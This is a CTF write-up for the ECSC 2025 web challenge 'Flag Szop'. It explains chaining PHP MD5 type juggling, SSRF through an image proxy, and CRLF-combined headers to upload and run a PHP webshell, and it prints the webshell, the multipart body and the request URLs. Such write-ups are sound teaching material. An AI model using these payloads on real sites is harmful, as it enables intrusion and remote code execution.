---
title: "Flag Szop - ECSC 2025 Web Challenge Writeup"
description: "Detailed writeup of Flag Szop web challenge from ECSC 2025. Exploit PHP type juggling vulnerability, bypass SSRF protection, and upload PHP webshell to capture the flag."
ctf: "ECSC 2025"
date: 2025-10-09
category: web
difficulty: medium
flag_format: "ECSC{...}"
author: "zeba"
---

# Flag Szop

**ECSC 2025** · Web · Medium

## Solution Overview

This challenge involves exploiting a PHP type juggling vulnerability, bypassing SSRF protection, and navigating proxy header limitations to upload and execute a PHP webshell.

**TL;DR:** Exploit MD5 hash comparison with loose equality, use imgproxy SSRF to access localhost-only admin panel, discover that multiple `header=` parameters don't work in the proxy, combine headers into a single parameter with `\r\n` separator, upload PHP shell with password+file in one multipart request, execute `/var/www/html/readflag` binary.

## Tools Used

- Python 3 with `requests` library
- curl
- Browser developer tools

## Initial Reconnaissance

The challenge presents a web application with an image proxy at `/imgproxy`. Looking at the source code (`script.php`), we identified the admin panel at `/admin` with several security checks:

1. **Accept-Language Check**: Must contain "id" (Indonesian)
2. **IP Address Check**: Must be from `127.0.0.1` or `::1` (localhost only)
3. **Password Authentication**: Checks MD5 hash against `0e198271987298738473298472398488`
4. **File Upload**: After authentication, allows uploading files with preserved extensions

The imgproxy allows us to make requests to internal endpoints:

```text
/imgproxy?url=http://127.0.0.1/admin&method=POST&data=...&header=...
```

## Vulnerability Analysis

### 1. PHP Type Juggling (Critical)

The password check uses loose comparison:

```php
if (md5($_POST['pass']) != $szop_pass_hash)
```

The hash `0e198271987298738473298472398488` starts with `0e` followed by only digits. PHP interprets this as scientific notation (0 × 10^...). Any password whose MD5 also starts with `0e` followed by digits will equal `0`.

**Magic password found:** `240610708` → MD5: `0e462097431906509019562988736854`

### 2. SSRF via imgproxy

The `/imgproxy` endpoint allows us to make requests to `127.0.0.1`, bypassing the IP check. We can authenticate and upload files by proxying through this endpoint.

### 3. No File Extension Validation

The admin panel preserves the original file extension without validation, allowing us to upload executable `.php` files.

## Exploitation Journey

### Challenge 1: Session Management

**Problem:** After authenticating through the proxy, subsequent requests fail the Accept-Language check.

**Analysis:** The proxy maintains its own session (visible in cookies), but the backend at `127.0.0.1` has a separate session that we can't access directly. The backend sets `$_SESSION['admin'] = true`, but this session is server-side only.

**Failed Attempts:**

- Extracting backend session cookie (not accessible through proxy)
- Using proxy's session for subsequent requests (different domains)
- Accessing `/admin` directly (blocked by IP check)

**Solution:** We need to do BOTH authentication AND file upload in a SINGLE request!

### Challenge 2: Multipart Request with Password and File

**Idea:** Send a multipart POST that contains both:

- `pass` field with value `240610708`
- `file` field with our PHP shell

**Problem:** When we tried to add a `Content-Type` header for multipart:

```text
&header=Accept-Language:%20id&header=Content-Type:%20multipart/form-data
```

The Accept-Language check started failing!

### Challenge 3: The Proxy Header Bug (Critical Discovery!)

**Debugging process:**

1. Simple auth works: ✓

   ```text
   ?url=...&method=POST&data=pass=240610708&header=Accept-Language:%20id
   ```

2. Adding second header fails: ✗

   ```text
   ?url=...&data=...&header=Accept-Language:%20id&header=Content-Type:...
   ```

**Discovery:** The imgproxy only supports ONE `header=` parameter! When you add a second one, it ignores or overwrites the first.

**Solution:** Combine multiple headers into a single parameter using `\r\n` (URL encoded as `%0D%0A`):

```text
header=Accept-Language:%20id%0D%0AContent-Type:%20multipart/form-data;%20boundary=...
```

### Final Exploit

1. **Construct multipart body** with both password and file:

```text
--boundary
Content-Disposition: form-data; name="pass"

240610708
--boundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/x-php

<?php system($_GET["c"] ?? "cat /flag*"); ?>
--boundary--
```

2. **Combine headers** in single parameter:

```text
Accept-Language:%20id%0D%0AContent-Type:%20multipart/form-data;%20boundary=boundary
```

3. **Send request** through imgproxy:

```text
/imgproxy?url=http://127.0.0.1/admin&method=POST&header=<combined>&data=<multipart>
```

4. **Extract filename** from "OK: /img/xxxxx.php" response

5. **Execute commands** via uploaded shell:

```text
/img/xxxxx.php?c=/var/www/html/readflag
```

## Full Solution Script

See [`solve/exploit.py`](solve/exploit.py) for the complete exploit script.

## Flag

`ECSC{raccoon_shopping_cart_full_of_flags}`

---

[← Back to ECSC 2025](../../README.md)
